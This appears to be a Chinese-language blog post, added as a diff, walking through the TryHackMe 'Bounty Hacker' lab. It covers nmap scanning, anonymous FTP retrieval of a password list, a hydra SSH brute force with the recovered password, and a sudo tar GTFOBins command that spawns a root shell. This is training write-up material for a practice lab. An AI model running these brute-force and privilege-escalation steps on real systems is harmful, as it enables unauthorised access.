@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all這是我第一次用中文寫滲透的 Write Up (?)這台機器蠻簡單的，但我會寫詳細點，給社員當參考 &gt;&lt;   靶機 IP : 10.10.2.219我的 IP : 10.8.211.34   一個基本的滲透流程需要包含RECON（偵查／信息蒐集），Exploit（漏洞利用），Privilege Escalation(權限提升)，以及整理（像是我現在在撰寫 Write">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bounty Hacker on TryHackMe">
+<meta property="og:url" content="http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all這是我第一次用中文寫滲透的 Write Up (?)這台機器蠻簡單的，但我會寫詳細點，給社員當參考 &gt;&lt;   靶機 IP : 10.10.2.219我的 IP : 10.8.211.34   一個基本的滲透流程需要包含RECON（偵查／信息蒐集），Exploit（漏洞利用），Privilege Escalation(權限提升)，以及整理（像是我現在在撰寫 Write">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/SklVBMz3T.png">
+<meta property="article:published_time" content="2024-02-21T01:10:04.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pentesting">
+<meta property="article:tag" content="TryHackMe">
+<meta property="article:tag" content="ftp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/SklVBMz3T.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Bounty Hacker on TryHackMe</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/02/21/2024-1-2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/02/13/proxy-dos/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&text=Bounty Hacker on TryHackMe"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&is_video=false&description=Bounty Hacker on TryHackMe"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bounty Hacker on TryHackMe&body=Check out this article: http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&name=Bounty Hacker on TryHackMe&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&t=Bounty Hacker on TryHackMe"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON"><span class="toc-number">2.1.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.1.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp"><span class="toc-number">2.2.1.</span> <span class="toc-text">ftp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh"><span class="toc-number">2.2.2.</span> <span class="toc-text">ssh</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tar-escalation"><span class="toc-number">2.3.1.</span> <span class="toc-text">tar escalation</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Bounty Hacker on TryHackMe
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-02-21T01:10:04.000Z" class="dt-published" itemprop="datePublished">2024-02-20</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Pentesting/" rel="tag">Pentesting</a>, <a class="p-category" href="/tags/TryHackMe/" rel="tag">TryHackMe</a>, <a class="p-category" href="/tags/ftp/" rel="tag">ftp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這是我第一次用中文寫滲透的 Write Up (?)<br>這台機器蠻簡單的，但我會寫詳細點，給社員當參考 &gt;&lt;  </p>
+<p>靶機 IP : 10.10.2.219<br>我的 IP : 10.8.211.34  </p>
+<p>一個基本的滲透流程需要包含RECON（偵查／信息蒐集），Exploit（漏洞利用），Privilege Escalation(權限提升)，以及整理（像是我現在在撰寫 Write Up 的行為），有時候必須做權限穩固、提出修改建議等動作。  </p>
+<h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p>首先，利用端口掃描工具<code>nmap</code>確認靶機開放的端口以及該端口的服務是什麼。  </p>
+<p><strong>指令：</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -sV -PN 10.10.163.232</span><br></pre></td></tr></table></figure>
+<p><strong>結果：</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-20 19:14 CST</span><br><span class="line">Nmap scan report for 10.10.163.232</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: TIMEOUT</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.195.189</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)</span><br><span class="line">|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)</span><br><span class="line">|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.16 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>分析：</strong><br>此機器共打開了三個端口，分別為：  </p>
+<ul>
+<li>port 21 的 ftp 服務，而且允許以Anonymous的身分登入，登入後可以透過服務取得檔案。  </li>
+<li>port 22 的 ssh 服務，需要密碼，登入後可以以特定使用者身分操作終端機。  </li>
+<li>port 80 的網站，接下來可以進行路徑掃描。</li>
+</ul>
+<h4 id="directory-enumeration"><a href="#directory-enumeration" class="headerlink" title="directory enumeration"></a>directory enumeration</h4><p>接下來利用路徑猜解工具<code>dirsearch</code>進行路徑爆破。  </p>
+<p><strong>指令：</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.10.163.232/</span><br></pre></td></tr></table></figure>
+<p><strong>結果：</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2                                                                                              </span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                       </span><br><span class="line">                                                                                                                              </span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/10.10.163.232/-_24-02-20_19-16-47.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors-24-02-20_19-16-47.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.163.232/</span><br><span class="line"></span><br><span class="line">[19:16:47] Starting: </span><br><span class="line">[19:16:54] 403 -  278B  - /.ht_wsr.txt                                     </span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess.bak1</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess.orig</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess.save</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess.sample</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess_extra</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess_orig</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccess_sc</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccessOLD</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccessBAK</span><br><span class="line">[19:16:54] 403 -  278B  - /.htaccessOLD2</span><br><span class="line">[19:16:54] 403 -  278B  - /.htm                                            </span><br><span class="line">[19:16:54] 403 -  278B  - /.html</span><br><span class="line">[19:16:54] 403 -  278B  - /.htpasswds</span><br><span class="line">[19:16:54] 403 -  278B  - /.htpasswd_test</span><br><span class="line">[19:16:54] 403 -  278B  - /.httr-oauth</span><br><span class="line">[19:17:47] 301 -  315B  - /images  -&gt;  http://10.10.163.232/images/         </span><br><span class="line">[19:17:47] 200 -  938B  - /images/                                          </span><br><span class="line">[19:17:48] 200 -  969B  - /index.html                                       </span><br><span class="line">[19:18:09] 403 -  278B  - /server-status/                                   </span><br><span class="line">[19:18:09] 403 -  278B  - /server-status                                    </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed                        </span><br></pre></td></tr></table></figure>
+<p><strong>分析：</strong><br>經過探查，在此階段並沒有帶漏洞服務的出現，亦沒有透過網站洩漏的資訊。  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h4><p>因為 ftp 開放 Anonymous 無密碼登入，進去 ftp 後先透過 <code>ls -al</code>的指令列出目錄內容。<br><strong>結果：</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||40893|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .</span><br><span class="line">drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..</span><br><span class="line">-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt</span><br><span class="line">-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt</span><br></pre></td></tr></table></figure>
+<p>註：本動作重複進行了多次才成功，可能與網路環境有關。  </p>
+<p>透過<code>get locks.txt</code>以及<code>get task.txt</code>的指令在本機取得<code>locks.txt</code>和<code>task.txt</code>的內容。  </p>
+<p><strong>task.txt</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.) Protect Vicious.</span><br><span class="line">2.) Plan for Red Eye pickup on the moon.</span><br><span class="line"></span><br><span class="line">-lin</span><br></pre></td></tr></table></figure>
+<p><strong>locks.txt</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">rEddrAGON</span><br><span class="line">ReDdr4g0nSynd!cat3</span><br><span class="line">Dr@gOn$yn9icat3</span><br><span class="line">R3DDr46ONSYndIC@Te</span><br><span class="line">ReddRA60N</span><br><span class="line">R3dDrag0nSynd1c4te</span><br><span class="line">dRa6oN5YNDiCATE</span><br><span class="line">ReDDR4g0n5ynDIc4te</span><br><span class="line">R3Dr4gOn2044</span><br><span class="line">RedDr4gonSynd1cat3</span><br><span class="line">R3dDRaG0Nsynd1c@T3</span><br><span class="line">Synd1c4teDr@g0n</span><br><span class="line">reddRAg0N</span><br><span class="line">REddRaG0N5yNdIc47e</span><br><span class="line">Dra6oN$yndIC@t3</span><br><span class="line">4L1mi6H71StHeB357</span><br><span class="line">rEDdragOn$ynd1c473</span><br><span class="line">DrAgoN5ynD1cATE</span><br><span class="line">ReDdrag0n$ynd1cate</span><br><span class="line">Dr@gOn$yND1C4Te</span><br><span class="line">RedDr@gonSyn9ic47e</span><br><span class="line">REd$yNdIc47e</span><br><span class="line">dr@goN5YNd1c@73</span><br><span class="line">rEDdrAGOnSyNDiCat3</span><br><span class="line">r3ddr@g0N</span><br><span class="line">ReDSynd1ca7e</span><br></pre></td></tr></table></figure>
+<p><strong>分析：</strong>  </p>
+<ul>
+<li>1.有一位叫做<code>lin</code>的使用者。  </li>
+<li>2.locks.txt極有可能為密碼列表。</li>
+</ul>
+<h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><p>因為端口22有開放 ssh 的服務，結合剛剛在 #ssh 獲得的資訊，利用密碼暴力破解工具<code>hydra</code>進行下一步攻擊。  </p>
+<p><strong>指令：</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l lin -P locks.txt -t 64 ssh://10.10.163.232</span><br></pre></td></tr></table></figure>
+<p><strong>結果：</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-20 19:56:54</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 26 tasks per 1 server, overall 26 tasks, 26 login tries (l:1/p:26), ~1 try per task</span><br><span class="line">[DATA] attacking ssh://10.10.163.232:22/</span><br><span class="line">[22][ssh] host: 10.10.163.232   login: lin   password: RedDr4gonSynd1cat3</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-20 19:57:00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功取得密碼：<code>RedDr4gonSynd1cat3</code>  </p>
+<h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>在弱點利用的階段後，成功取得一般使用者<code>lin</code>的控制權。<br>接下來要試著取得管理帳號<code>root</code>的控制權。<br>透過指令 <code>sudo -l</code> 查詢當前使用者（<code>lin</code>）的各項權限：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for lin on bountyhacker:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User lin may run the following commands on bountyhacker:</span><br><span class="line">    (root) /bin/tar</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>發現可以以<code>root</code>的身分操作<code>tar</code>指令。  </p>
+<h4 id="tar-escalation"><a href="#tar-escalation" class="headerlink" title="tar escalation"></a>tar escalation</h4><p>查詢<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a>上關於tar的使用方式，找到提權指令：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</span><br></pre></td></tr></table></figure>
+<p>成功獲得root權限！  </p>
+<p><img src="https://hackmd.io/_uploads/SklVBMz3T.png" alt="image">  </p>
+<p>至此，滲透結束。<br>註：本來進入root時應該在<code>/bin/sh</code>的階段，可以使用：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+<p>取得如圖的bash狀態，但非必要。  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">2.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RECON"><span class="toc-number">2.1.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.1.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp"><span class="toc-number">2.2.1.</span> <span class="toc-text">ftp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ssh"><span class="toc-number">2.2.2.</span> <span class="toc-text">ssh</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">2.3.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tar-escalation"><span class="toc-number">2.3.1.</span> <span class="toc-text">tar escalation</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&text=Bounty Hacker on TryHackMe"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&title=Bounty Hacker on TryHackMe"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/&is_video=false&description=Bounty Hacker on TryHackMe"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Bounty Hacker on TryHackMe&body=Check out this article: http://wha13.github.io/2024/02/20/THM-Bounty-Hacker/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
